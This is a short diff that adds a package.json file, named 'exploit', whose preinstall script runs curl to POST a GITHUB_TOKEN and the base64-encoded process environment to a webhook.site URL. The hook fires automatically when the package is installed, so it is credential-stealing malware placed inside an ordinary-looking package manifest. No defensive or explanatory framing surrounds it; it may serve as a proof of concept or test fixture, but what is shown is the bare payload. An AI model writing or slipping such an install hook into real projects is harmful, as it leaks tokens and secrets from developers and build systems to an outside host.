@@ -1,0 +1,7 @@
+{
+  "name": "exploit",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -X POST https://webhook.site/YOUR_ID -d 'token=$GITHUB_TOKEN' -d 'env=$(env | base64 -w0)'"
+  }
+}
